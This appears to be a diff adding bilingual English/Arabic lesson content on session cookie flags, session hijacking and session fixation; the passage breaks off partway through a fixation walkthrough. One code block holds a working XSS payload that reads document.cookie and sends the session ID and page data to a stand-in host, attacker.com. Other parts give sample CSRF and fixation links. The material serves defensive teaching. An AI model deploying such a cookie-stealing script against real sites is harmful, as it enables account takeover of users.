+                "ar": "بدون SameSite، يتم إرسال ملفات تعريف الارتباط تلقائياً مع الطلبات من أي موقع، مما يتيح CSRF. ينشئ المهاجم صفحة ضارة بنموذج ينشر إلى بنك الضحية. عندما يزور الضحية صفحة المهاجم أثناء تسجيل الدخول إلى البنك، يرسل المتصفح ملف تعريف ارتباط جلسة البنك مع الطلب المزيف. مع SameSite=Strict، يرفض المتصفح إرسال ملف تعريف الارتباط مع الطلبات عبر المواقع، مما يمنع CSRF تماماً."
+              },
+              "example": {
+                "en": "Example: Attacker hosts <form action='bank.com/transfer' method='POST'><input name='amount' value='10000'>. With SameSite=Strict, bank cookie not sent.",
+                "ar": "مثال: يستضيف المهاجم <form action='bank.com/transfer' method='POST'><input name='amount' value='10000'>. مع SameSite=Strict، لا يتم إرسال ملف تعريف ارتباط البنك."
+              }
+            }
+          ]
+        },
+        {
+          "id": 19,
+          "type": "terminal",
+          "label": {
+            "en": "Example: Viewing cookie security flags in browser",
+            "ar": "مثال: عرض علامات أمان ملفات تعريف الارتباط في المتصفح"
+          },
+          "value": "# Open browser Developer Tools (F12), go to Application/Storage tab, select Cookies\n\n# Secure cookie (GOOD):\nName: sessionId\nValue: a7b9c3d5e8f2g4h6i9j2k5\nDomain: .example.com\nPath: /\nExpires: Session\nSize: 45\nHttpOnly: ✓ (checkmark)\nSecure: ✓ (checkmark)\nSameSite: Strict\n\n# Insecure cookie (BAD):\nName: session\nValue: 12345\nDomain: .example.com\nPath: /\nExpires: 2027-01-01\nSize: 10\nHttpOnly: (empty - NOT SET)\nSecure: (empty - NOT SET)\nSameSite: None\n\n# The first cookie is properly secured\n# The second cookie is vulnerable to interception and theft"
+        },
+        {
+          "id": 20,
+          "type": "list",
+          "title": {
+            "en": "Complete Checklist for Secure Session Cookie Configuration",
+            "ar": "قائمة تحقق كاملة لتكوين ملف تعريف ارتباط جلسة آمن"
+          },
+          "items": {
+            "en": [
+              "Set Secure flag on all session cookies to enforce HTTPS-only transmission",
+              "Set HttpOnly flag on all session cookies to prevent JavaScript access",
+              "Set SameSite to Strict or Lax depending on cross-site functionality needs",
+              "Use cryptographically secure random session IDs with at least 128 bits of entropy",
+              "Implement reasonable session expiration times based on application sensitivity",
+              "Use session cookies (no Expires/Max-Age) for sensitive applications to auto-logout on browser close",
+              "Regenerate session ID after successful login to prevent session fixation",
+              "Invalidate old session when new session is created after authentication",
+              "Set Domain attribute to specific domain, avoid wildcards that might leak cookies to subdomains",
+              "Set Path attribute to most restrictive path needed by the application",
+              "Monitor and log session creation, validation, and expiration events",
+              "Implement absolute session timeout in addition to idle timeout for maximum security"
+            ],
+            "ar": [
+              "تعيين علامة Secure على جميع ملفات تعريف ارتباط الجلسة لفرض الإرسال عبر HTTPS فقط",
+              "تعيين علامة HttpOnly على جميع ملفات تعريف ارتباط الجلسة لمنع وصول JavaScript",
+              "تعيين SameSite إلى Strict أو Lax اعتماداً على احتياجات الوظائف عبر المواقع",
+              "استخدام معرفات جلسة عشوائية آمنة من الناحية التشفيرية بـ 128 بت من الإنتروبيا على الأقل",
+              "تنفيذ أوقات انتهاء صلاحية الجلسة المعقولة بناءً على حساسية التطبيق",
+              "استخدام ملفات تعريف ارتباط الجلسة (بدون Expires/Max-Age) للتطبيقات الحساسة للخروج التلقائي عند إغلاق المتصفح",
+              "إعادة إنشاء معرف الجلسة بعد تسجيل الدخول الناجح لمنع تثبيت الجلسة",
+              "إبطال الجلسة القديمة عند إنشاء جلسة جديدة بعد المصادقة",
+              "تعيين سمة Domain إلى نطاق محدد، تجنب أحرف البدل التي قد تتسرب ملفات تعريف الارتباط إلى النطاقات الفرعية",
+              "تعيين سمة Path إلى أكثر مسار مقيد يحتاجه التطبيق",
+              "مراقبة وتسجيل إنشاء الجلسة والتحقق منها وأحداث انتهاء الصلاحية",
+              "تنفيذ مهلة جلسة مطلقة بالإضافة إلى مهلة الخمول لأقصى قدر من الأمان"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic-8",
+      "title": {
+        "en": "Session Hijacking and Session Fixation Attacks",
+        "ar": "اختطاف الجلسات وهجمات تثبيت الجلسة"
+      },
+      "elements": [
+        {
+          "id": 1,
+          "type": "title",
+          "value": {
+            "en": "Understanding Web Sessions: How Applications Remember You",
+            "ar": "فهم جلسات الويب: كيف تتذكرك التطبيقات"
+          }
+        },
+        {
+          "id": 2,
+          "type": "text",
+          "value": {
+            "en": "HTTP is a stateless protocol, meaning each request from your browser to a web server is independent and contains no memory of previous requests. When you log into a website, the server needs a way to remember who you are for subsequent requests without asking you to log in repeatedly. This is accomplished through sessions. After successful authentication, the server creates a session on the server side, which is a data structure that stores information about your authenticated state, user ID, preferences, shopping cart contents, and other relevant data. The server generates a unique session identifier (session ID), which is a long random string that acts as a key to your session data. This session ID is sent to your browser, typically stored in a cookie.",
+            "ar": "HTTP هو بروتوكول عديم الحالة، مما يعني أن كل طلب من متصفحك إلى خادم الويب مستقل ولا يحتوي على ذاكرة للطلبات السابقة. عندما تسجل الدخول إلى موقع ويب، يحتاج الخادم إلى طريقة لتذكر من أنت للطلبات اللاحقة دون مطالبتك بتسجيل الدخول بشكل متكرر. يتم تحقيق ذلك من خلال الجلسات. بعد المصادقة الناجحة، ينشئ الخادم جلسة على جانب الخادم، وهي بنية بيانات تخزن معلومات حول حالة المصادقة الخاصة بك ومعرف المستخدم والتفضيلات ومحتويات عربة التسوق والبيانات الأخرى ذات الصلة. يولد الخادم معرف جلسة فريداً (session ID)، وهو سلسلة عشوائية طويلة تعمل كمفتاح لبيانات جلستك. يتم إرسال معرف الجلسة هذا إلى متصفحك، ويتم تخزينه عادة في ملف تعريف الارتباط (cookie)."
+          }
+        },
+        {
+          "id": 3,
+          "type": "text",
+          "value": {
+            "en": "For every subsequent request you make to the website, your browser automatically includes this session cookie in the HTTP headers. The server receives the session ID, looks up the corresponding session data in its storage, and knows you are authenticated without requiring login credentials again. This mechanism is fundamental to how modern web applications work. However, it introduces a critical security consideration: whoever possesses a valid session ID can impersonate the user associated with that session. If an attacker can steal, guess, or intercept your session ID, they gain complete access to your account without needing your username or password. This is the foundation of session hijacking attacks. The session ID becomes as valuable as the password itself because it provides immediate authenticated access.",
+            "ar": "لكل طلب لاحق تقدمه إلى الموقع، يتضمن متصفحك تلقائياً ملف تعريف ارتباط الجلسة هذا في رؤوس HTTP. يستقبل الخادم معرف الجلسة، ويبحث عن بيانات الجلسة المقابلة في مخزنه، ويعرف أنك مصادق عليه دون الحاجة إلى بيانات اعتماد تسجيل الدخول مرة أخرى. هذه الآلية أساسية لكيفية عمل تطبيقات الويب الحديثة. ومع ذلك، فإنه يقدم اعتباراً أمنياً حاسماً: أي شخص يمتلك معرف جلسة صالح يمكنه انتحال شخصية المستخدم المرتبط بتلك الجلسة. إذا تمكن المهاجم من سرقة أو تخمين أو اعتراض معرف جلستك، فإنه يحصل على وصول كامل إلى حسابك دون الحاجة إلى اسم المستخدم أو كلمة المرور. هذا هو أساس هجمات اختطاف الجلسات. يصبح معرف الجلسة قيماً مثل كلمة المرور نفسها لأنه يوفر وصولاً مصادقاً فورياً."
+          }
+        },
+        {
+          "id": 4,
+          "type": "orderedList",
+          "title": {
+            "en": "Session Lifecycle: From Creation to Destruction",
+            "ar": "دورة حياة الجلسة: من الإنشاء إلى الدمار"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "Session Creation (Login)",
+                "ar": "إنشاء الجلسة (تسجيل الدخول)"
+              },
+              "text": {
+                "en": "User submits valid credentials. Server verifies credentials against database. Upon successful authentication, server generates cryptographically random session ID (typically 128 bits or longer). Server creates session object in memory or persistent storage containing user information. Server sends session ID to client in Set-Cookie HTTP header.",
+                "ar": "يرسل المستخدم بيانات اعتماد صالحة. يتحقق الخادم من بيانات الاعتماد مقابل قاعدة البيانات. عند المصادقة الناجحة، يولد الخادم معرف جلسة عشوائي مشفر (عادة 128 بت أو أطول). ينشئ الخادم كائن جلسة في الذاكرة أو التخزين الدائم يحتوي على معلومات المستخدم. يرسل الخادم معرف الجلسة إلى العميل في رأس HTTP Set-Cookie."
+              },
+              "example": {
+                "en": "Set-Cookie: SESSIONID=a3f7b9c2d1e5f8a9b4c7d2e6f1a8b5c9; HttpOnly; Secure; SameSite=Strict",
+                "ar": "Set-Cookie: SESSIONID=a3f7b9c2d1e5f8a9b4c7d2e6f1a8b5c9; HttpOnly; Secure; SameSite=Strict"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Session Maintenance (Active Use)",
+                "ar": "صيانة الجلسة (الاستخدام النشط)"
+              },
+              "text": {
+                "en": "Browser automatically includes session cookie in every request to the domain. Server receives cookie, extracts session ID, and retrieves associated session data. Server validates session is not expired and user permissions. Server processes request using authenticated user context. Server may update session data (last activity time, cart contents, etc.).",
+                "ar": "يتضمن المتصفح تلقائياً ملف تعريف ارتباط الجلسة في كل طلب إلى المجال. يستقبل الخادم ملف تعريف الارتباط، ويستخرج معرف الجلسة، ويسترجع بيانات الجلسة المرتبطة. يتحقق الخادم من أن الجلسة لم تنته صلاحيتها وصلاحيات المستخدم. يعالج الخادم الطلب باستخدام سياق المستخدم المصادق عليه. قد يقوم الخادم بتحديث بيانات الجلسة (وقت النشاط الأخير، محتويات العربة، إلخ)."
+              },
+              "example": {
+                "en": "Cookie: SESSIONID=a3f7b9c2d1e5f8a9b4c7d2e6f1a8b5c9 (sent automatically with each request)",
+                "ar": "Cookie: SESSIONID=a3f7b9c2d1e5f8a9b4c7d2e6f1a8b5c9 (يُرسل تلقائياً مع كل طلب)"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Session Expiration (Timeout)",
+                "ar": "انتهاء صلاحية الجلسة (المهلة)"
+              },
+              "text": {
+                "en": "Sessions have configurable lifetime limits. Absolute timeout: Maximum time since session creation regardless of activity (e.g., 24 hours). Idle timeout: Maximum time of inactivity (e.g., 30 minutes without requests). When timeout reached, server marks session as invalid and may delete session data. Next request with expired session ID is treated as unauthenticated.",
+                "ar": "الجلسات لها حدود عمر قابلة للتكوين. المهلة المطلقة: الحد الأقصى للوقت منذ إنشاء الجلسة بغض النظر عن النشاط (على سبيل المثال، 24 ساعة). مهلة الخمول: الحد الأقصى لوقت عدم النشاط (على سبيل المثال، 30 دقيقة بدون طلبات). عند الوصول إلى المهلة، يحدد الخادم الجلسة على أنها غير صالحة وقد يحذف بيانات الجلسة. يتم التعامل مع الطلب التالي بمعرف جلسة منتهي الصلاحية على أنه غير مصادق عليه."
+              },
+              "example": {
+                "en": "User inactive for 31 minutes → Session expires → Next page load redirects to login page",
+                "ar": "المستخدم غير نشط لمدة 31 دقيقة → تنتهي صلاحية الجلسة → التحميل التالي للصفحة يعيد التوجيه إلى صفحة تسجيل الدخول"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Session Destruction (Logout)",
+                "ar": "دمار الجلسة (تسجيل الخروج)"
+              },
+              "text": {
+                "en": "User clicks logout button. Browser sends logout request including session cookie. Server invalidates session on server side (marks as logged out or deletes). Server instructs browser to delete session cookie. Server may keep session record for audit purposes but marks it unusable. Any attempts to use the old session ID after logout should be rejected.",
+                "ar": "ينقر المستخدم على زر تسجيل الخروج. يرسل المتصفح طلب تسجيل خروج يتضمن ملف تعريف ارتباط الجلسة. يبطل الخادم الجلسة على جانب الخادم (يحدد على أنها مسجلة الخروج أو يحذف). يرشد الخادم المتصفح لحذف ملف تعريف ارتباط الجلسة. قد يحتفظ الخادم بسجل الجلسة لأغراض التدقيق ولكن يحددها على أنها غير قابلة للاستخدام. يجب رفض أي محاولات لاستخدام معرف الجلسة القديم بعد تسجيل الخروج."
+              },
+              "example": {
+                "en": "Set-Cookie: SESSIONID=; expires=Thu, 01 Jan 1970 00:00:00 GMT (tells browser to delete cookie)",
+                "ar": "Set-Cookie: SESSIONID=; expires=Thu, 01 Jan 1970 00:00:00 GMT (يخبر المتصفح بحذف ملف تعريف الارتباط)"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Session Regeneration (Security Event)",
+                "ar": "إعادة توليد الجلسة (حدث أمني)"
+              },
+              "text": {
+                "en": "On privilege escalation or sensitive operations, server may regenerate session ID. Server creates new random session ID. Server copies session data from old session to new session. Server invalidates old session ID. Server sends new session ID to browser. This prevents session fixation attacks and limits impact of compromised session IDs.",
+                "ar": "عند تصعيد الامتياز أو العمليات الحساسة، قد يعيد الخادم توليد معرف الجلسة. ينشئ الخادم معرف جلسة عشوائي جديد. ينسخ الخادم بيانات الجلسة من الجلسة القديمة إلى الجلسة الجديدة. يبطل الخادم معرف الجلسة القديم. يرسل الخادم معرف الجلسة الجديد إلى المتصفح. هذا يمنع هجمات تثبيت الجلسة ويحد من تأثير معرفات الجلسة المخترقة."
+              },
+              "example": {
+                "en": "User logs in → session ID: abc123. User changes password → server generates new session ID: xyz789.",
+                "ar": "يسجل المستخدم الدخول → معرف الجلسة: abc123. يغير المستخدم كلمة المرور → الخادم يولد معرف جلسة جديد: xyz789."
+              }
+            }
+          ]
+        },
+        {
+          "id": 5,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Session IDs should be at least 128 bits of cryptographically random data, making them practically impossible to guess. A 128-bit random value has 2^128 possible combinations, which is approximately 340 undecillion possibilities.",
+            "ar": "يجب أن تكون معرفات الجلسة على الأقل 128 بت من البيانات العشوائية المشفرة، مما يجعلها مستحيلة عملياً للتخمين. القيمة العشوائية 128 بت لديها 2^128 تركيبة ممكنة، وهو ما يقارب 340 غير ديسيليون احتمال."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 6,
+          "type": "hr"
+        },
+        {
+          "id": 7,
+          "type": "title",
+          "value": {
+            "en": "Session Hijacking: Stealing Session IDs to Impersonate Users",
+            "ar": "اختطاف الجلسات: سرقة معرفات الجلسة لانتحال شخصية المستخدمين"
+          }
+        },
+        {
+          "id": 8,
+          "type": "text",
+          "value": {
+            "en": "Session hijacking is the attack where an adversary obtains a valid session ID and uses it to impersonate the legitimate user. Unlike credential theft which requires stealing usernames and passwords, session hijacking only requires obtaining the session ID. This is often easier because session IDs are transmitted with every request and may be exposed through various channels. Once an attacker has a valid session ID, they can insert it into their own browser and immediately gain access to the victim's account without triggering additional authentication. The application server cannot distinguish between requests from the legitimate user and requests from the attacker because both present the same valid session ID. This makes session hijacking particularly dangerous because it bypasses password protections entirely.",
+            "ar": "اختطاف الجلسات هو الهجوم الذي يحصل فيه الخصم على معرف جلسة صالح ويستخدمه لانتحال شخصية المستخدم الشرعي. على عكس سرقة بيانات الاعتماد التي تتطلب سرقة أسماء المستخدمين وكلمات المرور، يتطلب اختطاف الجلسات فقط الحصول على معرف الجلسة. غالباً ما يكون هذا أسهل لأن معرفات الجلسة تُرسل مع كل طلب وقد تتعرض من خلال قنوات مختلفة. بمجرد أن يكون لدى المهاجم معرف جلسة صالح، يمكنه إدراجه في متصفحه الخاص والحصول على وصول فوري إلى حساب الضحية دون تفعيل مصادقة إضافية. لا يمكن لخادم التطبيق التمييز بين الطلبات من المستخدم الشرعي والطلبات من المهاجم لأن كليهما يقدم نفس معرف الجلسة الصالح. هذا يجعل اختطاف الجلسات خطيراً بشكل خاص لأنه يتجاوز حماية كلمة المرور بالكامل."
+          }
+        },
+        {
+          "id": 9,
+          "type": "text",
+          "value": {
+            "en": "There are multiple techniques attackers use to steal session IDs. Network sniffing involves capturing network traffic between the victim and the server. If the connection is not encrypted with HTTPS, session cookies are transmitted in plain text and can be read by anyone monitoring the network. This is particularly dangerous on public WiFi networks where an attacker can position themselves to intercept all traffic. Cross-site scripting (XSS) attacks inject malicious JavaScript into vulnerable web pages that can access and steal cookies, then transmit them to the attacker's server. Session sidejacking uses browser extensions or malware on the victim's device to extract cookies directly from the browser's cookie storage. Man-in-the-middle attacks intercept communications between victim and server, even on HTTPS connections if the attacker can bypass certificate validation through other attacks. Session prediction exploits weak session ID generation where attackers can predict valid session IDs by analyzing patterns in previously observed IDs.",
+            "ar": "هناك تقنيات متعددة يستخدمها المهاجمون لسرقة معرفات الجلسة. يتضمن شم الشبكة التقاط حركة مرور الشبكة بين الضحية والخادم. إذا لم يكن الاتصال مشفراً ب HTTPS، يتم نقل ملفات تعريف ارتباط الجلسة بنص عادي ويمكن قراءتها من قبل أي شخص يراقب الشبكة. هذا خطير بشكل خاص على شبكات WiFi العامة حيث يمكن للمهاجم وضع نفسه لاعتراض جميع حركة المرور. تحقن هجمات البرمجة النصية عبر المواقع (XSS) JavaScript ضاراً في صفحات الويب الضعيفة التي يمكنها الوصول إلى ملفات تعريف الارتباط وسرقتها، ثم نقلها إلى خادم المهاجم. يستخدم الاختطاف الجانبي للجلسة ملحقات المتصفح أو البرامج الضارة على جهاز الضحية لاستخراج ملفات تعريف الارتباط مباشرة من مخزن ملفات تعريف ارتباط المتصفح. تعترض هجمات الرجل في المنتصف الاتصالات بين الضحية والخادم، حتى على اتصالات HTTPS إذا تمكن المهاجم من تجاوز التحقق من الشهادة من خلال هجمات أخرى. يستغل التنبؤ بالجلسة توليد معرف جلسة ضعيف حيث يمكن للمهاجمين التنبؤ بمعرفات الجلسة الصالحة من خلال تحليل الأنماط في المعرفات المرصودة سابقاً."
+          }
+        },
+        {
+          "id": 10,
+          "type": "list",
+          "title": {
+            "en": "Common Session Hijacking Attack Vectors",
+            "ar": "نواقل هجوم اختطاف الجلسات الشائعة"
+          },
+          "items": {
+            "en": [
+              "Network Sniffing on Unencrypted HTTP: Attacker uses packet capture tools like Wireshark on shared network to read plain-text cookies from HTTP traffic. Prevention: Always use HTTPS with valid certificates",
+              "XSS Cookie Theft: Malicious JavaScript injected through XSS vulnerability executes document.cookie and sends results to attacker server. Prevention: Set HttpOnly flag on cookies, implement CSP headers, sanitize user input",
+              "Session ID in URL: Application mistakenly places session ID in URL parameters instead of cookies. URLs are logged in browser history, proxy logs, and referrer headers. Prevention: Never put session IDs in URLs, always use secure cookies",
+              "Public Computer Attacks: User logs in on shared computer and fails to logout. Next user or attacker retrieves session cookie from browser. Prevention: Implement absolute session timeouts, educate users to logout, clear cookies on logout",
+              "Malware and Browser Extensions: Malicious software or compromised browser extensions read cookies from browser storage. Prevention: Use secure device hygiene, review installed extensions, implement additional security layers like device fingerprinting",
+              "WiFi Evil Twin: Attacker creates fake WiFi access point mimicking legitimate network, intercepts all traffic including session cookies. Prevention: Use VPN on public networks, verify network authenticity, use HTTPS everywhere"
+            ],
+            "ar": [
+              "شم الشبكة على HTTP غير المشفر: يستخدم المهاجم أدوات التقاط الحزم مثل Wireshark على شبكة مشتركة لقراءة ملفات تعريف الارتباط بنص عادي من حركة مرور HTTP. الوقاية: استخدم دائماً HTTPS مع شهادات صالحة",
+              "سرقة ملفات تعريف الارتباط XSS: ينفذ JavaScript الضار المحقون من خلال ثغرة XSS document.cookie ويرسل النتائج إلى خادم المهاجم. الوقاية: قم بتعيين علامة HttpOnly على ملفات تعريف الارتباط، نفذ رؤوس CSP، طهّر مدخلات المستخدم",
+              "معرف الجلسة في URL: يضع التطبيق معرف الجلسة بالخطأ في معلمات URL بدلاً من ملفات تعريف الارتباط. يتم تسجيل عناوين URL في سجل المتصفح وسجلات البروكسي ورؤوس الإحالة. الوقاية: لا تضع معرفات الجلسة في عناوين URL أبداً، استخدم دائماً ملفات تعريف ارتباط آمنة",
+              "هجمات الكمبيوتر العام: يسجل المستخدم الدخول على كمبيوتر مشترك ويفشل في تسجيل الخروج. يسترجع المستخدم التالي أو المهاجم ملف تعريف ارتباط الجلسة من المتصفح. الوقاية: نفذ مهلات جلسة مطلقة، ثقّف المستخدمين على تسجيل الخروج، امسح ملفات تعريف الارتباط عند تسجيل الخروج",
+              "البرامج الضارة وملحقات المتصفح: تقرأ البرامج الضارة أو ملحقات المتصفح المخترقة ملفات تعريف الارتباط من مخزن المتصفح. الوقاية: استخدم نظافة جهاز آمنة، راجع الملحقات المثبتة، نفذ طبقات أمان إضافية مثل بصمة الجهاز",
+              "توأم WiFi الشرير: ينشئ المهاجم نقطة وصول WiFi مزيفة تحاكي الشبكة الشرعية، ويعترض جميع حركة المرور بما في ذلك ملفات تعريف ارتباط الجلسة. الوقاية: استخدم VPN على الشبكات العامة، تحقق من أصالة الشبكة، استخدم HTTPS في كل مكان"
+            ]
+          }
+        },
+        {
+          "id": 11,
+          "type": "code",
+          "language": "javascript",
+          "value": "// Example: XSS attack stealing session cookie\n// This demonstrates how vulnerable applications can leak session IDs\n// Educational purpose - shows why HttpOnly flag is critical\n\n// VULNERABLE APPLICATION CODE (missing HttpOnly flag)\n// Server sets cookie without HttpOnly protection:\n// Set-Cookie: session=abc123xyz789; Secure; SameSite=Strict\n\n// ATTACKER'S MALICIOUS SCRIPT injected via XSS vulnerability\n// This script runs in victim's browser with full access to cookies\n\n(function() {\n    // Access all cookies accessible to JavaScript\n    var allCookies = document.cookie;\n    \n    // Extract session ID from cookies\n    var sessionMatch = allCookies.match(/session=([^;]+)/);\n    \n    if (sessionMatch && sessionMatch[1]) {\n        var sessionId = sessionMatch[1];\n        \n        // Send stolen session ID to attacker's server\n        var attackerServer = 'https://attacker.com/collect';\n        \n        // Create hidden image to send data without user seeing anything\n        var img = document.createElement('img');\n        img.src = attackerServer + '?session=' + sessionId + \n                  '&url=' + encodeURIComponent(window.location.href) +\n                  '&user=' + encodeURIComponent(document.body.innerText.substring(0, 50));\n        img.style.display = 'none';\n        document.body.appendChild(img);\n        \n        // Alternatively, use fetch API for more sophisticated exfiltration\n        fetch(attackerServer, {\n            method: 'POST',\n            headers: {'Content-Type': 'application/json'},\n            body: JSON.stringify({\n                sessionId: sessionId,\n                targetUrl: window.location.href,\n                userAgent: navigator.userAgent,\n                timestamp: new Date().toISOString()\n            }),\n            mode: 'no-cors'  // Bypass CORS restrictions\n        });\n    }\n})();\n\n// SECURE APPLICATION CODE (with HttpOnly flag)\n// Server sets cookie with HttpOnly protection:\n// Set-Cookie: session=abc123xyz789; HttpOnly; Secure; SameSite=Strict\n//\n// With HttpOnly flag set:\n// - document.cookie will NOT include this cookie\n// - JavaScript cannot access the session ID\n// - Cookie is only sent with HTTP requests, not accessible to scripts\n// - XSS attacks cannot steal the session ID through JavaScript\n\n// DEFENSE IN DEPTH: Additional protections\n// 1. Content Security Policy (CSP)\napp.use((req, res, next) => {\n    res.setHeader(\n        'Content-Security-Policy',\n        \"default-src 'self'; script-src 'self'; object-src 'none'\"\n    );\n    next();\n});\n\n// 2. Set secure cookie options\napp.use(session({\n    secret: 'cryptographically-random-secret-key',\n    name: 'sessionId',  // Use non-obvious cookie name\n    cookie: {\n        httpOnly: true,      // Prevent JavaScript access\n        secure: true,        // Only send over HTTPS\n        sameSite: 'strict',  // Prevent CSRF\n        maxAge: 3600000      // 1 hour expiration\n    },\n    resave: false,\n    saveUninitialized: false\n}));\n\n// 3. Input sanitization to prevent XSS\nconst validator = require('validator');\n\nfunction sanitizeInput(userInput) {\n    // Escape HTML special characters\n    return validator.escape(userInput);\n}\n\n// 4. Session binding to IP and User-Agent (with caution)\nfunction validateSessionBinding(req, session) {\n    if (session.ipAddress !== req.ip) {\n        // IP changed - potential hijacking\n        return false;\n    }\n    if (session.userAgent !== req.headers['user-agent']) {\n        // User agent changed - potential hijacking\n        return false;\n    }\n    return true;\n}"
+        },
+        {
+          "id": 12,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "The HttpOnly cookie flag is one of the most important session security controls. It prevents JavaScript from accessing cookies, making XSS-based session theft impossible. Always set HttpOnly=true for session cookies.",
+            "ar": "علامة ملف تعريف الارتباط HttpOnly هي واحدة من أهم ضوابط أمان الجلسة. تمنع JavaScript من الوصول إلى ملفات تعريف الارتباط، مما يجعل سرقة الجلسة القائمة على XSS مستحيلة. قم دائماً بتعيين HttpOnly=true لملفات تعريف ارتباط الجلسة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 13,
+          "type": "hr"
+        },
+        {
+          "id": 14,
+          "type": "title",
+          "value": {
+            "en": "Session Fixation: Forcing Users into Compromised Sessions",
+            "ar": "تثبيت الجلسة: إجبار المستخدمين على جلسات مخترقة"
+          }
+        },
+        {
+          "id": 15,
+          "type": "text",
+          "value": {
+            "en": "Session fixation is a sophisticated attack where the attacker tricks the victim into using a session ID that the attacker already knows. Unlike session hijacking where the attacker steals an existing valid session, in session fixation the attacker creates or obtains a session ID and forces it upon the victim before the victim authenticates. The attack follows this pattern: First, the attacker obtains a valid session ID from the target application, either by visiting the site themselves or through other means. Second, the attacker tricks the victim into using this predetermined session ID, accomplished through various techniques like crafting malicious links or using XSS. Third, the victim logs into the application while unknowingly using the attacker-controlled session ID. Fourth, since the victim authenticated using the session ID that the attacker knows, the attacker can now use that same session ID to access the victim's account. The key vulnerability being exploited is that the application does not generate a new session ID after successful authentication.",
+            "ar": "تثبيت الجلسة هو هجوم متطور حيث يخدع المهاجم الضحية لاستخدام معرف جلسة يعرفه المهاجم بالفعل. على عكس اختطاف الجلسة حيث يسرق المهاجم جلسة صالحة موجودة، في تثبيت الجلسة ينشئ المهاجم أو يحصل على معرف جلسة ويفرضه على الضحية قبل أن يصادق الضحية. يتبع الهجوم هذا النمط: أولاً، يحصل المهاجم على معرف جلسة صالح من التطبيق المستهدف، إما بزيارة الموقع بأنفسهم أو من خلال وسائل أخرى. ثانياً، يخدع المهاجم الضحية لاستخدام معرف الجلسة المحدد مسبقاً، يتم إنجازه من خلال تقنيات مختلفة مثل صياغة روابط ضارة أو استخدام XSS. ثالثاً، يسجل الضحية الدخول إلى التطبيق بينما يستخدم دون علم معرف الجلسة الذي يتحكم فيه المهاجم. رابعاً، نظراً لأن الضحية صادق باستخدام معرف الجلسة الذي يعرفه المهاجم، يمكن للمهاجم الآن استخدام نفس معرف الجلسة للوصول إلى حساب الضحية. الثغرة الرئيسية التي يتم استغلالها هي أن التطبيق لا يولد معرف جلسة جديد بعد المصادقة الناجحة."
+          }
+        },
+        {
+          "id": 16,
+          "type": "text",
+          "value": {
+            "en": "Session fixation attacks are delivered through several methods. URL-based fixation sends the victim a link containing the session ID as a parameter, such as https://bank.com/login?sessionid=attacker_known_id. When the victim clicks this link and logs in, they use the attacker's session ID. Cookie-based fixation uses XSS or other client-side vulnerabilities to set a specific session cookie in the victim's browser before they log in. Form field injection places the attacker's session ID in hidden form fields on the login page. Meta tag injection uses meta refresh tags to redirect victims through URLs that set specific session IDs. The common thread in all these approaches is that the application accepts session IDs from client input and does not regenerate the session ID upon authentication. This acceptance of externally provided session IDs combined with failure to regenerate on privilege changes creates the fixation vulnerability.",
+            "ar": "يتم تسليم هجمات تثبيت الجلسة من خلال عدة طرق. يرسل التثبيت المستند إلى URL للضحية رابطاً يحتوي على معرف الجلسة كمعامل، مثل https://bank.com/login?sessionid=attacker_known_id. عندما ينقر الضحية على هذا الرابط ويسجل الدخول، يستخدم معرف جلسة المهاجم. يستخدم التثبيت المستند إلى ملف تعريف الارتباط XSS أو ثغرات أخرى من جانب العميل لتعيين ملف تعريف ارتباط جلسة محدد في متصفح الضحية قبل تسجيل الدخول. يضع حقن حقل النموذج معرف جلسة المهاجم في حقول نموذج مخفية على صفحة تسجيل الدخول. يستخدم حقن علامة Meta علامات تحديث meta لإعادة توجيه الضحايا من خلال عناوين URL التي تعيّن معرفات جلسة محددة. الخيط المشترك في جميع هذه الأساليب هو أن التطبيق يقبل معرفات الجلسة من مدخلات العميل ولا يعيد توليد معرف الجلسة عند المصادقة. هذا القبول لمعرفات الجلسة المقدمة خارجياً جنباً إلى جنب مع الفشل في إعادة التوليد عند تغيرات الامتياز يخلق ثغرة التثبيت."
+          }
+        },
+        {
+          "id": 17,
+          "type": "orderedList",
+          "title": {
+            "en": "Session Fixation Attack Execution: Step-by-Step Process",
+            "ar": "تنفيذ هجوم تثبيت الجلسة: العملية خطوة بخطوة"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "Step 1: Attacker Obtains Valid Session ID",
+                "ar": "الخطوة 1: يحصل المهاجم على معرف جلسة صالح"
+              },
+              "text": {
+                "en": "Attacker visits the target website (e.g., vulnerable-bank.com). Application automatically assigns a session ID to attacker's browser. Attacker extracts this session ID from their browser cookies or network traffic. Attacker notes the session ID format and how it is transmitted (cookie, URL parameter, form field).",
+                "ar": "يزور المهاجم الموقع المستهدف (على سبيل المثال، vulnerable-bank.com). يعيّن التطبيق تلقائياً معرف جلسة لمتصفح المهاجم. يستخرج المهاجم معرف الجلسة هذا من ملفات تعريف ارتباط متصفحه أو حركة مرور الشبكة. يلاحظ المهاجم تنسيق معرف الجلسة وكيفية نقله (ملف تعريف الارتباط، معامل URL، حقل نموذج)."
+              },
+              "example": {
+                "en": "Attacker visits site and receives: Set-Cookie: PHPSESSID=attk3r5355i0n1d",
+                "ar": "يزور المهاجم الموقع ويتلقى: Set-Cookie: PHPSESSID=attk3r5355i0n1d"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Step 2: Attacker Forces Session ID on Victim",
+                "ar": "الخطوة 2: يفرض المهاجم معرف الجلسة على الضحية"
+              },
+              "text": {
+                "en": "Attacker crafts a malicious link containing the predetermined session ID. Attacker sends this link to victim via email, social media, or compromised websites. Victim clicks the link, believing it to be legitimate. Victim's browser loads the page with the attacker-controlled session ID already set. Victim sees normal login page and does not suspect anything wrong.",
+                "ar": "يصوغ المهاجم رابطاً ضاراً يحتوي على معرف الجلسة المحدد مسبقاً. يرسل المهاجم هذا الرابط إلى الضحية عبر البريد الإلكتروني أو وسائل التواصل الاجتماعي أو المواقع المخترقة. ينقر الضحية على الرابط، معتقداً أنه شرعي. يحمّل متصفح الضحية الصفحة مع معرف الجلسة الذي يتحكم فيه المهاجم معيناً بالفعل. يرى الضحية صفحة تسجيل دخول عادية ولا يشتبه في أي شيء خاطئ."
+              },
